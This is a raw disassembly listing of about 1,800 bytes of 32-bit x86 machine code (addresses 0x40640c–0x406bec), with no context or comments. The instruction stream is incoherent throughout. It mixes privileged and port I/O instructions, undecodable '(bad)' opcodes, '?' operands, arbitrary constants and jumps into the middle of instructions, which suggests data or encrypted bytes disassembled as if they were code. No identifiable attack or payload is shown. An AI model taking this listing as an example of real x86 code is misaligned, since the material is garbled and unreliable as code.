  40640c:	sub    ebx,DWORD PTR [ebx+0x3b]
  40640f:	call   FWORD PTR [edx-0x11]
  406412:	shl    DWORD PTR [ebx-0x551ad9fe],0xdf
  406419:	xor    ebx,eax
  40641b:	xor    eax,0x46d1391a
  406420:	or     ecx,ebp
  406422:	dec    esp
  406423:	push   edi
  406424:	add    BYTE PTR [eax],al
  406426:	inc    edi
  406427:	or     ecx,esp
  406429:	sub    al,0x87
  40642b:	or     BYTE PTR [esi+0x0],al
  40642e:	add    cl,ah
  406430:	fdiv   QWORD PTR [edi]
  406432:	cmp    DWORD PTR [ecx],0x71b7ba2d
  406438:	pop    ebx
  406439:	out    dx,eax
  40643a:	xchg   ebx,eax
  40643b:	cmp    ah,BYTE PTR [edi]
  40643d:	pop    ebx
  40643e:	pop    ds
  40643f:	jo     0x40648c
  406441:	mov    BYTE PTR [esi+0x0],al
  406444:	add    BYTE PTR [esi+0x38f1da75],al
  40644a:	popa   
  40644b:	inc    edx
  40644c:	cmp    BYTE PTR [ebx+0x36],0xaa
  406450:	mov    eax,0x7b03156d
  406455:	lock or eax,0xd0331a2c
  40645b:	cmp    al,0x7a
  40645d:	sahf   
  40645e:	mov    al,ds:0x782aef29
  406463:	and    bh,dh
  406465:	and    edi,DWORD PTR [edx+0x6381b17f]
  40646b:	shl    DWORD PTR [eax+0x6d64348f],cl
  406471:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406472:	push   ebp
  406473:	out    dx,al
  406474:	jle    0x4063fe
  406476:	imul   eax,DWORD PTR [eax],0x0
  406479:	dec    edi
  40647a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40647b:	(bad)  [edi]
  40647d:	js     0x4064a2
  40647f:	push   ebp
  406480:	adc    dl,BYTE PTR [eax-0x79]
  406483:	cmp    edx,DWORD PTR [edx-0x5a]
  406486:	xor    DWORD PTR [ecx],0x1d
  406489:	jbe    0x4064da
  40648b:	dec    esp
  40648c:	outs   dx,DWORD PTR ds:[esi]
  40648d:	add    BYTE PTR [eax],al
  40648f:	std    
  406490:	or     BYTE PTR [ebp+0x0],al
  406493:	add    BYTE PTR [eax+0x1cf3b5e5],dl
  406499:	sub    DWORD PTR ds:0xd285d273,edi
  40649f:	cs ins BYTE PTR es:[edi],dx
  4064a1:	sub    DWORD PTR [edi],0xf008a5
  4064a7:	add    BYTE PTR [ebp+0x9],ch
  4064aa:	jno    0x40648b
  4064ac:	sub    al,0xb1
  4064ae:	or     eax,0x75f0aa4b
  4064b3:	int3   
  4064b4:	rol    BYTE PTR [eax],1
  4064b6:	add    BYTE PTR [ecx+0x797e3976],bh
  4064bc:	jle    0x4064fc
  4064be:	imul   ecx,DWORD PTR [ebp-0x4a23c8da],0x20
  4064c5:	jle    0x40649c
  4064c7:	icebp  
  4064c8:	gs push dx
  4064cb:	repz loopne 0x40648c
  4064ce:	sub    DWORD PTR [edx],esi
  4064d0:	inc    esi
  4064d1:	jp     0x4064d5
  4064d3:	jg     0x406535
  4064d5:	push   edx
  4064d6:	sbb    al,0x3e
  4064d8:	pop    ds
  4064d9:	xor    BYTE PTR [ecx],dh
  4064db:	fst    DWORD PTR [edx]
  4064dd:	cmc    
  4064de:	daa    
  4064df:	ret    
  4064e0:	mov    al,ds:0x14f65409
  4064e5:	(bad)  
  4064e6:	iret   
  4064e7:	cmp    DWORD PTR [edx+ebp*1+0x0],ecx
  4064eb:	add    BYTE PTR [esi+0x3e],dh
  4064ee:	aam    0x70
  4064f0:	xor    bh,dl
  4064f2:	imul   ebx,DWORD PTR [eax+0x33],0x6c7c320d
  4064f9:	dec    ebp
  4064fa:	jg     0x4064f6
  4064fc:	push   es
  4064fd:	inc    edi
  4064fe:	jg     0x406572
  406500:	dec    esi
  406501:	mov    esi,0xf3c8
  406506:	mov    ebp,edi
  406508:	inc    esp
  406509:	pop    esp
  40650a:	add    BYTE PTR [eax],al
  40650c:	aad    0xaf
  40650e:	shr    DWORD PTR [ebx+0x4975c3b5],0xf9
  406515:	mov    esi,?
  406517:	add    BYTE PTR [eax],al
  406519:	cmp    eax,0xfd14c368
  40651e:	xor    eax,0x1ae8b170
  406523:	or     BYTE PTR ds:0x6f040000,dh
  406529:	add    BYTE PTR [eax],al
  40652b:	xor    DWORD PTR ds:0x4e2d3e50,esp
  406531:	or     al,bl
  406533:	add    BYTE PTR [eax],al
  406535:	mov    BYTE PTR [edi-0x20],0xb0
  406539:	gs aas 
  40653b:	stos   DWORD PTR es:[edi],eax
  40653c:	mov    eax,eax
  40653e:	mov    al,BYTE PTR [eax]
  406540:	add    al,bh
  406542:	inc    ebx
  406543:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406544:	mov    bh,BYTE PTR [eax]
  406546:	cmp    bh,BYTE PTR [esi]
  406548:	push   ds
  406549:	hlt    
  40654a:	fstp   TBYTE PTR [edi]
  40654c:	push   ds
  40654d:	mov    ebp,0x8c7e7463
  406552:	inc    esp
  406553:	add    BYTE PTR [eax],al
  406555:	xchg   esi,eax
  406556:	jecxz  0x406553
  406558:	push   ds
  406559:	sbb    edi,ecx
  40655b:	sbb    eax,0xbd02b2a8
  406560:	inc    DWORD PTR ds:0xbdb662d6
  406566:	addr16 std 
  406568:	jp     0x406543
  40656a:	adc    DWORD PTR [esi+0x4c],0xfffffff8
  40656e:	add    BYTE PTR [eax],al
  406570:	jbe    0x406528
  406572:	lock sbb ch,bl
  406575:	xchg   edx,eax
  406576:	shl    ebx,cl
  406578:	cmp    edi,DWORD PTR [ebx-0x4192160b]
  40657e:	xchg   edx,eax
  40657f:	int    0xfe
  406581:	icebp  
  406582:	jp     0x406597
  406584:	pop    ecx
  406585:	mov    edi,0x665623bb
  40658a:	sub    al,0x17
  40658c:	ret    0x4cb9
  40658f:	sub    eax,0xcf380000
  406594:	je     0x4065f1
  406596:	cli    
  406597:	fstp   st(3)
  406599:	(bad)  
  40659b:	js     0x4065a4
  40659d:	fnstenv [ebp-0x364b02a3]
  4065a3:	pop    ebp
  4065a4:	fisttp DWORD PTR [edi+0xea0c47]
  4065aa:	add    BYTE PTR [ebx+0x76],bl
  4065ad:	jmp    0xc4f04e4e
  4065b2:	xchg   edx,eax
  4065b3:	add    BYTE PTR [eax],al
  4065b5:	bound  eax,QWORD PTR [ebx-0x21b7d366]
  4065bb:	add    BYTE PTR [eax],al
  4065bd:	pop    es
  4065be:	cdq    
  4065bf:	mov    dl,al
  4065c1:	add    BYTE PTR [eax],al
  4065c3:	dec    ebp
  4065c4:	aam    0x85
  4065c6:	call   0xa05e7026
  4065cb:	ins    DWORD PTR es:[edi],dx
  4065cc:	(bad)  
  4065cd:	lahf   
  4065ce:	call   0x300475f5
  4065d3:	add    BYTE PTR [eax],al
  4065d5:	js     0x40661d
  4065d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4065d8:	and    edi,DWORD PTR [eax+edi*1]
  4065db:	bound  edi,QWORD PTR [edi-0x1f5094a3]
  4065e1:	jmp    0xe9b1ad5
  4065e6:	add    ah,BYTE PTR [ebp+0x32]
  4065e9:	sbb    esi,DWORD PTR [esi+eax*8]
  4065ec:	out    0x77,eax
  4065ee:	ss int 0x15
  4065f1:	iret   
  4065f2:	and    BYTE PTR [ebx+0x78e1a358],dh
  4065f8:	sub    edx,eax
  4065fa:	xor    eax,0xd1ffb76c
  4065ff:	neg    DWORD PTR [edi-0x2598f250]
  406605:	mov    bh,0xb1
  406607:	jmp    0x7c3d:0x98a5b7d2
  40660e:	int3   
  40660f:	xchg   esi,eax
  406610:	add    BYTE PTR [eax],al
  406612:	iret   
  406613:	cwde   
  406614:	dec    edx
  406615:	push   cs
  406616:	mov    ah,0xaf
  406618:	imul   edx,DWORD PTR [eax-0x2ba96c8e],0xa500
  406622:	jne    0x40666c
  406624:	repz add BYTE PTR [eax],al
  406627:	js     0x406653
  406629:	test   eax,0x7788
  40662e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40662f:	jo     0x4065eb
  406631:	fbstp  TBYTE PTR [ecx+0x45b355d2]
  406637:	pop    es
  406638:	mov    ebp,0x37e07f7f
  40663d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40663e:	fwait
  40663f:	stos   DWORD PTR es:[edi],eax
  406640:	add    BYTE PTR [esi],0x0
  406643:	add    BYTE PTR [esi-0x69945055],ch
  406649:	into   
  40664a:	cdq    
  40664b:	mov    ecx,DWORD PTR [esi-0x2d]
  40664e:	dec    eax
  40664f:	jnp    0x406651
  406651:	add    BYTE PTR [edx],dl
  406653:	scas   eax,DWORD PTR es:[edi]
  406654:	jnp    0x4065f9
  406656:	push   eax
  406657:	fiadd  DWORD PTR [ebp-0x63]
  40665a:	retf   0xf1b
  40665d:	or     BYTE PTR [edi+0x24d60000],ch
  406663:	mov    ?,WORD PTR [ecx+0x78c8cd42]
  406669:	add    BYTE PTR [eax],al
  40666b:	xchg   edx,eax
  40666c:	add    eax,0x9ebe0def
  406671:	sbb    al,BYTE PTR [eax+edx*1+0x49490000]
  406678:	adc    ebp,DWORD PTR [edi+edi*1]
  40667b:	mov    bh,0xc3
  40667d:	push   edi
  40667e:	daa    
  40667f:	and    BYTE PTR [ebx],bh
  406681:	in     eax,0x2e
  406683:	mov    al,ds:0xdccc2b
  406688:	add    BYTE PTR [ecx],dh
  40668a:	dec    esi
  40668b:	rol    DWORD PTR [eax+0x50],0x0
  40668f:	add    BYTE PTR [ebp+0x3b],al
  406692:	fsubr  QWORD PTR es:[eax-0x23]
  406696:	and    BYTE PTR [ebp+0x7b8e76f4],ch
  40669c:	idiv   BYTE PTR [ecx+ecx*8-0x182331ae]
  4066a3:	sti    
  4066a4:	push   DWORD PTR ds:0x713ae427
  4066aa:	rcl    DWORD PTR [ecx-0x28],0x6d
  4066ae:	mov    bh,0x1e
  4066b0:	jl     0x40669e
  4066b2:	int3   
  4066b3:	inc    ecx
  4066b4:	add    BYTE PTR [eax],al
  4066b6:	push   es
  4066b7:	mov    edx,0xf83787d7
  4066bc:	mov    ah,0x9b
  4066be:	pop    edi
  4066bf:	mov    BYTE PTR [eax-0x29],0x0
  4066c3:	add    BYTE PTR [edx-0x5c4c46e1],bl
  4066c9:	jnp    0x4066de
  4066cb:	sub    esp,DWORD PTR [ebp+eiz*8+0x5543cdfb]
  4066d2:	jo     0x4066d0
  4066d4:	ficomp DWORD PTR [ecx]
  4066d6:	jge    0x40666e
  4066d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066d9:	push   eax
  4066da:	or     BYTE PTR [edx-0x24d50000],al
  4066e0:	call   0x74b3d4d9
  4066e5:	push   0xffffffc7
  4066e7:	les    di,DWORD PTR [esi-0x17fe0000]
  4066ee:	lock dec esp
  4066f0:	push   edx
  4066f1:	add    BYTE PTR [eax],al
  4066f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4066f4:	dec    esp
  4066f5:	sub    al,0x0
  4066f7:	add    bh,bl
  4066f9:	inc    esi
  4066fa:	sahf   
  4066fb:	jge    0x4066ab
  4066fd:	bound  edi,QWORD PTR [esi]
  4066ff:	xor    ch,BYTE PTR [esi+0x92041d]
  406705:	add    BYTE PTR [ebp-0x56],bh
  406708:	lock jl 0x406715
  40670b:	inc    edx
  40670c:	imul   edx,esi,0x31
  40670f:	in     eax,dx
  406710:	dec    edx
  406711:	sahf   
  406712:	cmc    
  406713:	stos   BYTE PTR es:[edi],al
  406714:	rol    BYTE PTR [ecx],1
  406716:	mov    al,BYTE PTR [esi+eax*8]
  406719:	add    BYTE PTR [eax],al
  40671b:	jbe    0x406752
  40671d:	loopne 0x4066ec
  40671f:	add    bh,bl
  406721:	add    BYTE PTR [eax],al
  406723:	jnp    0x4066a8
  406725:	mov    WORD PTR [ebp+0x54330000],cs
  40672b:	out    0x7a,al
  40672d:	dec    ebp
  40672e:	lea    esi,[ecx]
  406730:	cmp    eax,0x683f7ee4
  406735:	adc    DWORD PTR ds:0xe9f3557b,0x26
  40673c:	xor    al,0x83
  40673e:	or     BYTE PTR ds:0xa67b0000,al
  406744:	out    0x93,al
  406746:	pop    eax
  406747:	stc    
  406748:	ja     0x406787
  40674a:	jmp    0xd8cbde92
  40674f:	sub    eax,0xb788a4
  406754:	add    BYTE PTR [eax+0x3a],dl
  406757:	push   edx
  406758:	and    BYTE PTR [eax+0x71],ah
  40675b:	ins    BYTE PTR es:[edi],dx
  40675c:	jo     0x406711
  40675e:	lock hlt 
  406760:	es int 0x84
  406763:	pop    edi
  406764:	add    BYTE PTR [eax],al
  406766:	cmp    DWORD PTR [esi-0x102b40c7],ebp
  40676c:	pop    edx
  40676d:	dec    eax
  40676e:	bound  eax,QWORD PTR [eax]
  406770:	add    BYTE PTR [ebp+0x78f83b0d],dh
  406776:	lock sbb BYTE PTR [edi-0x5b0c11da],dh
  40677d:	and    esi,DWORD PTR [ebx]
  40677f:	inc    esi
  406780:	scas   al,BYTE PTR es:[edi]
  406781:	inc    esi
  406782:	add    cl,BYTE PTR [eax+0x53]
  406785:	add    BYTE PTR [eax],al
  406787:	out    dx,eax
  406788:	iret   
  406789:	repnz data16 scas al,BYTE PTR es:[edi]
  40678c:	mov    bl,dl
  40678e:	push   ss
  40678f:	xlat   BYTE PTR ds:[ebx]
  406790:	jo     0x406736
  406792:	inc    eax
  406793:	add    BYTE PTR ds:[eax],al
  406796:	push   ebx
  406797:	es in  eax,0x22
  40679a:	(bad)  
  40679b:	(bad)  [esi]
  40679d:	outs   dx,BYTE PTR ds:[esi]
  40679e:	pop    edi
  40679f:	sbb    BYTE PTR [ecx+0x42d32db0],dh
  4067a5:	sahf   
  4067a6:	ret    
  4067a7:	push   ebx
  4067a8:	repnz daa 
  4067aa:	call   0x40c2f7
  4067af:	pop    ebp
  4067b0:	jne    0x40678d
  4067b2:	mov    dl,0xb1
  4067b4:	add    DWORD PTR [edi-0x1c],ebp
  4067b7:	sbb    eax,0x9668bede
  4067bc:	jnp    0x406763
  4067be:	hlt    
  4067bf:	lds    edx,FWORD PTR [ecx+0xe]
  4067c2:	daa    
  4067c3:	adc    al,0x5a
  4067c5:	sar    DWORD PTR ds:0xeba1eeda,cl
  4067cb:	mov    al,0xdb
  4067cd:	fucompp 
  4067cf:	push   ecx
  4067d0:	sub    eax,0xa7fc250f
  4067d5:	loopne 0x4067cf
  4067d7:	retf   
  4067d8:	or     al,0x76
  4067da:	add    BYTE PTR [eax],al
  4067dc:	sbb    ch,BYTE PTR [eax-0x275ed3fd]
  4067e2:	mov    ebx,0xbb24f4da
  4067e7:	adc    cl,dh
  4067e9:	or     DWORD PTR ds:0x664873,esp
  4067ef:	add    cl,bh
  4067f1:	repnz push esi
  4067f3:	mov    ds:0x44d2832c,eax
  4067f8:	add    DWORD PTR [eax],0x0
  4067fb:	xchg   BYTE PTR [ecx-0x6],bl
  4067fe:	adc    eax,DWORD PTR [ebp+0x10]
  406801:	pop    esi
  406802:	mov    al,0xe0
  406804:	sbb    eax,0xefa37030
  406809:	mov    ebp,0xcffedeaa
  40680e:	pop    esp
  40680f:	mov    al,0x43
  406811:	adc    al,0x78
  406813:	jge    0x406892
  406815:	push   edi
  406816:	sub    al,0xab
  406818:	pop    eax
  406819:	push   ss
  40681a:	sbb    DWORD PTR [esi+0x24ae5be7],0xfffffff3
  406821:	das    
  406822:	aam    0x3d
  406824:	push   cs
  406825:	jno    0x406851
  406827:	adc    al,0xe
  406829:	aas    
  40682a:	add    esi,DWORD PTR [ecx]
  40682c:	push   cs
  40682d:	data16 (bad) 
  40682f:	aam    0x3a
  406831:	sbb    esp,DWORD PTR [eax+0x1b2de3f5]
  406837:	imul   ebp,DWORD PTR [ecx],0x25
  40683a:	outs   dx,DWORD PTR ds:[esi]
  40683b:	push   ss
  40683c:	push   cs
  40683d:	mov    ch,dh
  40683f:	and    DWORD PTR [ebx-0x62],0xf6fed7b4
  406846:	test   DWORD PTR [eax-0x75],edi
  406849:	push   ebx
  40684a:	xchg   esi,eax
  40684b:	jb     0x40686f
  40684d:	mov    bl,0xde
  40684f:	xor    ebx,ebx
  406851:	sub    eax,esi
  406853:	add    eax,0x8fb192d4
  406858:	cli    
  406859:	jo     0x4068ce
  40685b:	int    0x65
  40685d:	push   ecx
  40685e:	push   ecx
  40685f:	push   cs
  406860:	xchg   ebp,eax
  406861:	push   ebx
  406862:	sbb    esi,esp
  406864:	lds    esi,FWORD PTR [edx]
  406866:	push   esi
  406867:	pop    esi
  406868:	std    
  406869:	jbe    0x4068a9
  40686b:	shl    BYTE PTR [ecx+0x8],cl
  40686e:	jne    0x406870
  406870:	add    BYTE PTR [ecx+0x1957c15a],bh
  406876:	mov    ds:0xa5d7f469,eax
  40687b:	mov    WORD PTR [ebx+0x37060000],?
  406881:	add    esp,edx
  406883:	fs aam 0xef
  406886:	div    BYTE PTR [ebx]
  406888:	add    ecx,DWORD PTR [edi+0x39]
  40688b:	adc    ah,bh
  40688d:	fdivr  st,st(4)
  40688f:	dec    edi
  406890:	inc    esp
  406891:	mov    ebp,0x83c00000
  406896:	add    BYTE PTR [eax],al
  406898:	ja     0x4068b8
  40689a:	pop    ss
  40689b:	test   DWORD PTR [edi+esi*4+0x10660000],0x632f72bc
  4068a6:	push   ebx
  4068a7:	lock sub DWORD PTR [ebp*2+0x6e3b66d1],edx
  4068af:	dec    esi
  4068b0:	or     esp,DWORD PTR [edi-0xf]
  4068b3:	cmp    DWORD PTR [ebx+0xa83177a],ebp
  4068b9:	scas   al,BYTE PTR es:[edi]
  4068ba:	dec    edx
  4068bb:	or     BYTE PTR [ecx],ah
  4068bd:	add    BYTE PTR [eax],al
  4068bf:	es call 0x0:0xdf804986
  4068c7:	add    eax,0x946ee075
  4068cc:	mov    ecx,0x3a29dbea
  4068d1:	inc    ebp
  4068d2:	push   esp
  4068d3:	cmp    BYTE PTR [eax+0x190000b0],cl
  4068d9:	xor    DWORD PTR [ebp+0x1d48],ecx
  4068df:	jge    0x40691f
  4068e1:	add    eax,0x2a5867bc
  4068e6:	retf   
  4068e7:	imul   esi,esi,0x139d3978
  4068ed:	mov    eax,ds:0xc713f0d2
  4068f2:	push   esp
  4068f3:	lods   eax,DWORD PTR ds:[esi]
  4068f4:	popf   
  4068f5:	mov    edi,0x3e22343a
  4068fa:	aam    0xcc
  4068fc:	and    DWORD PTR [eax],eax
  4068fe:	add    BYTE PTR [ebx-0x49],bh
  406901:	inc    ebp
  406902:	xor    eax,0x788aa1bd
  406907:	sbb    BYTE PTR [edx+eiz*1+0x79],0xab
  40690c:	rol    BYTE PTR [edx],0x0
  40690f:	add    BYTE PTR [ebp-0x393f88df],cl
  406915:	add    BYTE PTR [eax],al
  406917:	add    al,0x64
  406919:	add    BYTE PTR [eax],al
  40691b:	and    BYTE PTR [eax],cl
  40691d:	in     eax,0x0
  40691f:	add    BYTE PTR [eax+0xfc0ca9],ch
  406925:	add    BYTE PTR [esi-0x3f],cl
  406928:	aad    0x6f
  40692a:	fs pusha 
  40692c:	xchg   esi,eax
  40692d:	sbb    DWORD PTR [ebx-0x22d7d7bf],edx
  406933:	aas    
  406934:	out    dx,eax
  406935:	and    BYTE PTR [eax],cl
  406937:	out    dx,eax
  406938:	add    BYTE PTR [eax],al
  40693a:	rcl    BYTE PTR [ebx],0x0
  40693d:	add    dl,bh
  40693f:	add    eax,0x6b203a1b
  406944:	jb     0x4068fe
  406946:	dec    eax
  406947:	xor    eax,DWORD PTR [eax]
  406949:	add    BYTE PTR [ecx+0x76],al
  40694c:	js     0xab4069bb
  406952:	rcr    BYTE PTR [edx],0x0
  406955:	add    BYTE PTR [ecx+0x45],dl
  406958:	add    eax,0xca8841f2
  40695d:	add    BYTE PTR [eax],al
  40695f:	mov    esp,0xebdc6354
  406964:	test   DWORD PTR [eax+0x2c],ebx
  406967:	inc    eax
  406968:	pop    edx
  406969:	add    BYTE PTR [eax],al
  40696b:	loop   0x40696a
  40696d:	sbb    DWORD PTR [edi+0x1d04d45e],0x0
  406974:	add    BYTE PTR [edi],bl
  406976:	or     eax,0xd3201a30
  40697b:	ror    dh,cl
  40697d:	jecxz  0x40695b
  40697f:	mov    ds:0xb37a7b74,eax
  406984:	pop    edi
  406985:	inc    ebx
  406986:	cmp    eax,0x320217f8
  40698b:	(bad)  
  40698c:	and    BYTE PTR [ebp+0x5e],ch
  40698f:	into   
  406990:	mov    ecx,0x42f9e17a
  406995:	jp     0x40691a
  406997:	and    eax,0x9840
  40699c:	ret    0xe6aa
  40699f:	je     0x406990
  4069a1:	xlat   BYTE PTR ds:[ebx]
  4069a2:	lods   al,BYTE PTR ds:[esi]
  4069a3:	push   ebp
  4069a4:	sub    al,0xe2
  4069a6:	mov    edi,0xf028be20
  4069ab:	into   
  4069ac:	jns    0x406935
  4069ae:	cli    
  4069af:	jbe    0x4069af
  4069b1:	test   eax,0xb6f27130
  4069b6:	cmp    al,BYTE PTR [edi-0x49]
  4069b9:	clc    
  4069ba:	and    al,BYTE PTR [ebx+ecx*8]
  4069bd:	add    BYTE PTR [eax],al
  4069bf:	or     cl,dl
  4069c1:	mov    dh,0x8
  4069c3:	jae    0x4069c5
  4069c5:	add    ch,dh
  4069c7:	cmc    
  4069c8:	sar    DWORD PTR [ecx],cl
  4069ca:	add    ah,cl
  4069cc:	add    BYTE PTR [eax],al
  4069ce:	sbb    ebx,eax
  4069d0:	pop    ss
  4069d1:	mov    bh,0x74
  4069d3:	ret    0x290a
  4069d6:	pop    ecx
  4069d7:	iret   
  4069d8:	dec    edx
  4069d9:	mov    ds:0xf8e738a1,al
  4069de:	xor    edx,DWORD PTR [ebx+0x7a]
  4069e1:	hlt    
  4069e2:	jbe    0x4069d7
  4069e4:	inc    eax
  4069e5:	test   DWORD PTR [eax],0xb081f100
  4069eb:	push   esi
  4069ec:	and    BYTE PTR [edx],bl
  4069ee:	mov    bh,0x40
  4069f0:	lds    eax,FWORD PTR [eax]
  4069f2:	add    BYTE PTR ds:0x2635a46c,cl
  4069f8:	outs   dx,DWORD PTR ds:[esi]
  4069f9:	fidiv  DWORD PTR [esp+edx*4-0x16]
  4069fd:	or     al,0xdc
  4069ff:	add    BYTE PTR [eax],al
  406a01:	add    bh,dh
  406a03:	add    BYTE PTR [eax],al
  406a05:	add    BYTE PTR [ebx],ah
  406a07:	add    BYTE PTR [eax],al
  406a09:	add    eax,0xe888
  406a0e:	loope  0x4069ff
  406a10:	adc    ecx,DWORD PTR [esi-0x1b]
  406a13:	addr16 pusha 
  406a15:	fist   WORD PTR [edi+0x3e0fd317]
  406a1b:	pop    ss
  406a1c:	jb     0x406a9c
  406a1e:	pop    ebp
  406a1f:	jg     0x4069e8
  406a21:	int3   
  406a22:	icebp  
  406a23:	add    BYTE PTR [eax],al
  406a25:	jae    0x4069d6
  406a27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a28:	mov    ch,0x6c
  406a2a:	cld    
  406a2b:	je     0x406a61
  406a2d:	cld    
  406a2e:	or     al,0x19
  406a30:	add    BYTE PTR [eax],al
  406a32:	test   eax,0xac21c7b8
  406a37:	cmp    al,0x31
  406a39:	xchg   ecx,esi
  406a3b:	icebp  
  406a3c:	loope  0x406a40
  406a3e:	inc    ebx
  406a3f:	jo     0x406a13
  406a41:	sti    
  406a42:	fstp   TBYTE PTR [edi-0x7be01164]
  406a48:	mov    edx,0xd3650000
  406a4d:	pop    edx
  406a4e:	mov    cl,0x9f
  406a50:	mov    sp,0x6d33
  406a54:	repnz push ss
  406a56:	mov    edi,0x67a87e0d
  406a5b:	dec    edx
  406a5c:	mov    ah,0xcf
  406a5e:	push   0xcf71ff99
  406a63:	mov    cs,edi
  406a65:	cdq    
  406a66:	mov    edi,ecx
  406a68:	or     eax,0xec773799
  406a6d:	push   0xffffff9e
  406a6f:	sti    
  406a70:	xor    DWORD PTR [eax-0x535fe4c],esi
  406a76:	leave  
  406a77:	test   eax,0xd3146b8b
  406a7c:	imul   eax,DWORD PTR [edx+0x581af9a2],0x25002d25
  406a86:	add    BYTE PTR [eax],al
  406a88:	add    al,0xd
  406a8a:	add    BYTE PTR [eax],al
  406a8c:	mov    dl,0xbc
  406a8e:	or     BYTE PTR [ecx],dl
  406a90:	add    BYTE PTR [eax],al
  406a92:	jae    0x406a90
  406a94:	sub    al,0x2
  406a96:	dec    ecx
  406a97:	daa    
  406a98:	ja     0x406a8c
  406a9a:	mov    esp,0x626ce111
  406a9f:	cmp    eax,0x488794d6
  406aa4:	scas   al,BYTE PTR es:[edi]
  406aa5:	add    BYTE PTR [eax],al
  406aa7:	cmc    
  406aa8:	sbb    dh,cl
  406aaa:	and    eax,0xc4005a
  406aaf:	add    BYTE PTR [edi-0x600090c6],bh
  406ab5:	sti    
  406ab6:	add    al,BYTE PTR [ecx+0x15]
  406ab9:	js     0x406a7a
  406abb:	rcr    DWORD PTR ds:0x517287a0,0x90
  406ac2:	jae    0x406a75
  406ac4:	pop    esi
  406ac5:	js     0x406a5e
  406ac7:	mov    dh,0x75
  406ac9:	retf   0xfea1
  406acc:	aad    0xdd
  406ace:	in     eax,dx
  406acf:	repz popa 
  406ad1:	shr    DWORD PTR [ecx+0xc000],cl
  406ad7:	cmp    BYTE PTR [ecx+0x2e596a05],ah
  406add:	inc    eax
  406ade:	rol    BYTE PTR [eax],cl
  406ae0:	add    BYTE PTR [ecx+eiz*1],al
  406ae3:	add    BYTE PTR [eax],al
  406ae5:	ret    0x178d
  406ae8:	icebp  
  406ae9:	test   esp,edx
  406aeb:	or     edi,DWORD PTR [esi+esi*4-0x3de762c6]
  406af2:	mov    ebp,0x2b808a6f
  406af7:	add    BYTE PTR [eax],al
  406af9:	mov    bl,0xf9
  406afb:	jbe    0x406ad5
  406afd:	mov    al,ds:0xd53eac9a
  406b02:	dec    ebx
  406b03:	bound  ebx,QWORD PTR [eax-0x23e31209]
  406b09:	lds    edx,FWORD PTR [ebp-0x6e]
  406b0c:	cmp    DWORD PTR [esi-0x7b900ba2],ebx
  406b12:	push   ecx
  406b13:	add    BYTE PTR [eax],al
  406b15:	add    BYTE PTR [ecx+0x0],cl
  406b18:	add    BYTE PTR [ecx-0x45],al
  406b1b:	leave  
  406b1c:	or     eax,0x876a2a47
  406b21:	xchg   edx,eax
  406b22:	je     0x406aa5
  406b24:	sub    BYTE PTR [esi+0x46ef6018],0x37
  406b2b:	sbb    al,BYTE PTR [esp+edi*2+0x69680000]
  406b32:	cld    
  406b33:	and    dl,al
  406b35:	xchg   esi,eax
  406b36:	mov    ch,0x34
  406b38:	inc    edi
  406b39:	dec    eax
  406b3a:	in     eax,dx
  406b3b:	add    BYTE PTR [eax],al
  406b3d:	int3   
  406b3e:	jbe    0x406b40
  406b40:	add    BYTE PTR [ebx],bh
  406b42:	jnp    0x406b84
  406b44:	pop    DWORD PTR [eax]
  406b46:	add    BYTE PTR [ebx+ecx*4],dl
  406b49:	fs push esp
  406b4b:	sbb    al,cl
  406b4d:	rol    DWORD PTR [eax],1
  406b4f:	add    cl,dh
  406b51:	lea    edi,[edx]
  406b53:	xor    DWORD PTR [ebp-0x6d],0xf0bb433f
  406b5a:	scas   al,BYTE PTR es:[edi]
  406b5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b5c:	add    bl,dl
  406b5e:	mov    ch,0xc
  406b60:	adc    DWORD PTR [eax],eax
  406b62:	add    BYTE PTR [edi-0x4b654c8e],al
  406b68:	fwait
  406b69:	dec    edi
  406b6a:	test   DWORD PTR [eax+ebx*8+0x4b],edi
  406b6e:	je     0x406b19
  406b70:	xchg   esi,eax
  406b71:	repz push edx
  406b73:	je     0x406bee
  406b75:	ja     0x406b25
  406b77:	lock pop ss
  406b79:	stos   BYTE PTR es:[edi],al
  406b7a:	cdq    
  406b7b:	ror    dh,cl
  406b7d:	cmp    ebx,DWORD PTR [ecx+0x52f5016b]
  406b83:	jbe    0x406bfc
  406b85:	ja     0x406b3a
  406b87:	mov    bl,0x56
  406b89:	mov    eax,0xfe30f795
  406b8e:	dec    edx
  406b8f:	mov    ecx,0xb011f2ff
  406b94:	arpl   WORD PTR [edi+0xe],di
  406b97:	test   al,0x58
  406b99:	aas    
  406b9a:	sar    ch,cl
  406b9c:	sbb    al,bh
  406b9e:	sub    al,0xed
  406ba0:	xchg   esi,eax
  406ba1:	clc    
  406ba2:	or     DWORD PTR [ebx],0xc51cb8f6
  406ba8:	iret   
  406ba9:	aas    
  406baa:	gs cld 
  406bac:	outs   dx,BYTE PTR ds:[esi]
  406bad:	stos   DWORD PTR es:[edi],eax
  406bae:	push   0x5284cd
  406bb3:	add    BYTE PTR ds:0x78d9500a,cl
  406bb9:	(bad)  
  406bba:	pop    esi
  406bbb:	das    
  406bbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406bbd:	push   es
  406bbe:	scas   eax,DWORD PTR es:[edi]
  406bbf:	jle    0x406bb1
  406bc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406bc2:	test   bh,0xf8
  406bc5:	dec    edi
  406bc6:	push   ds
  406bc7:	xchg   edi,eax
  406bc8:	ror    BYTE PTR [edi+0x0],0x0
  406bcc:	adc    cl,al
  406bce:	jb     0x406bd0
  406bd0:	add    BYTE PTR [ecx+0x14ef6d38],dh
  406bd6:	inc    DWORD PTR [esi]
  406bd8:	add    eax,esp
  406bda:	mov    ds:0xeed30000,eax
  406bdf:	aas    
  406be0:	cwde   
  406be1:	inc    eax
  406be2:	scas   eax,DWORD PTR es:[edi]
  406be3:	add    BYTE PTR [eax],al
  406be5:	adc    al,BYTE PTR [eax+0x79]
  406be8:	add    BYTE PTR [eax],al
  406bea:	pop    ds
  406beb:	dec    ebp
  406bec:	mov    ah,0xd1
